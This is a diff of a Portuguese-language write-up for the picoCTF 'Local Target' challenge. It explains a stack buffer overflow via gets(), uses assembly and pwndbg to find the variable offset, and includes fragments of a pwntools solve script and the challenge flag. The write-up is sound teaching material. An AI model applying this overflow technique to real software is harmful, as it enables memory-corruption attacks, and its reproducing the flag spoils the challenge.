@@ -1,16 +1,18 @@
 # WriteUp: Local Target
 ## Descrição do Desafio:
-Author: OverTheWire.org / LT 'syreal' Jones \
-Plataforma: [PicoCTF](https://play.picoctf.org/practice/challenge/399?category=6&page=1) \
-Categoria: Binary Exploitation \
-Dificuldade: Média \
-Descrição: 
+**Autor**: OverTheWire.org / LT 'syreal' Jones \
+**Plataforma**: [PicoCTF](https://play.picoctf.org/practice/challenge/399?category=6&page=1) \
+**Categoria**: Binary Exploitation \
+**Dificuldade**: Média \
+**Descrição**: 
 > Smash the Stack \
 > Can you overflow the buffer and modify the other local variable?
 
 ## Passo a passo da solução
 ### 1. Análise do arquivo fonte fornecido
 Este desafio já fornece o arquivo fonte, `.c`, tornando as coisas relativamente mais fáceis.
+
+{% code title="vuln.c" overflow="wrap" lineNumbers="true" %}
 
 ```c
 #include <stdio.h>
@@ -66,12 +68,14 @@ int main(){
 
 ```
 
-Observando o código, podemos ver que ele abre a `flag` e imprime ela caso a variável `num` seja igual a 65. Podemos também notar que a variável tem seu valor atribuído logo na declaração, e não tem o valor alterado em mais nenhum local, porém outra coisa chama a atenção, logo após a declaração da variável `num` inicia um sequência de código responsável por pedir ao usuário para escrever alguma coisa na variável `input`, que tem tamanho máximo de 15 caracteres.
+{% endcode %}
 
-E é aqui que esta a vulnerabilidade, a entrada do usuário está sendo capturada pela função `gets`, que não contém nenhum limitador, logo o usuário pode escrever quantos caracteres ele quiser.
+Observando o código, podemos ver que ele abre a **flag** e imprime ela caso a variável `num` seja igual a 65. Podemos também notar que a variável tem seu valor atribuído logo na declaração, e não tem o valor alterado em mais nenhum local, porém outra coisa chama a atenção, logo após a declaração da variável `num` inicia uma sequência de código responsável por pedir ao usuário para escrever alguma coisa na variável `input`, que tem tamanho máximo de 15 caracteres.
+
+E é aqui que está a vulnerabilidade, a entrada do usuário está sendo capturada pela função `gets`, que não contém nenhum limitador, logo o usuário pode escrever quantos caracteres ele quiser.
 
 ### 2. Exploit
-Descobrimos que podemos facilmente estourar o buffer, agora temos que descobrir onde está a variável `num` para reescrevermos o valor dela. Essa parte podemos fazer de duas formas, a primeira é imprimir a pilha e procurar nela o valor 64 (há alguns, mas com poucas tentativas você encontraria o correto), e a segunda é olhando para o assembly, isso nos mostra o local exato da variável.
+Descobrimos que podemos facilmente estourar o *buffer*, agora temos que descobrir onde está a variável `num` para reescrevermos o valor dela. Nessa parte podemos fazer de duas formas, a primeira é imprimir a pilha e procurar nela o valor 64 (há alguns, mas com poucas tentativas você encontraria o correto), e a segunda é olhando para o assembly, isso nos mostra o local exato da variável.
 
 ```bash 
 Dump of assembler code for function main:
@@ -99,7 +103,7 @@ Dump of assembler code for function main:
    0x0000000000401295 <+95>:    call   0x4010f0 <printf@plt>
 ```
 
-A sequência acima é o início da função `main`, mas o que nós queremos são as instruções próximas da `printf` que imprime o valor do `num` (no caso é o último `printf`). Como o `printf` está imprimindo o valor de `num` por meio das *strings* de formato, ele deve receber o valor dela como parâmetro, e analisando as instruções antes da chamada da função, vemos duas que se destacam: `mov    eax,DWORD PTR [rbp-0x8]` e `lea    rdi,[rip+0xd85]        # 0x402015`. 
+A sequência acima é o início da função `main`, mas o que nós queremos são as instruções próximas da `printf` que imprime o valor do `num` (no caso é o último `printf`). Como o `printf` está imprimindo o valor de `num` por meio das **strings de formato**, ele deve receber o valor dela como parâmetro, e analisando as instruções antes da chamada da função, vemos duas que se destacam: `mov    eax,DWORD PTR [rbp-0x8]` e `lea    rdi,[rip+0xd85]        # 0x402015`. 
 
 A primeira é o `num` e a segunda é a *string* inteira. Note que a instrução pega o valor do `num` subtraindo 8 do `rbp`, então nós podemos fazer a mesma coisa e descobrir a posição.
 
@@ -108,10 +112,12 @@ pwndbg> print $rbp - 8
 $2 = (void *) 0x7fffffffdc68
 ```
 
-E pronto, agora é só pegar o endereço de início da *string* e subtrair pelo valor encontrado. Como resultado descobriremos que devemos escrever 24 caracteres para chegar no `num` sendo o 25 o que vai reescrever.
+E pronto, agora é só pegar o endereço de início do *input* e subtrair pelo valor encontrado. Como resultado descobriremos que devemos escrever 24 caracteres para chegar no `num` sendo o 25º o que vai reescrever.
 
 ### 3. Solução
 A verificação no código pede para o valor de `num` ser 65 em decimal, esse número representa o caractere "A" na tabela ascii, então podemos resolver diretamente pelo terminal, ou usando um *script* simples em python.
+
+{% code title="solve.py" overflow="wrap" lineNumbers="true" %}
 
 ```py
 from pwn import *
@@ -126,8 +132,10 @@ p.sendlineafter(b": ", payload)
 print(p.recvall().decode())
 ```
 
+{% endcode %}
+
 ### Flag
 `picoCTF{l0c4l5_1n_5c0p3_7bd3fee1}`
 
-## Autor
+## Autor da WriteUp
 [Membro de Exploitation - HenriUz](https://github.com/HenriUz)
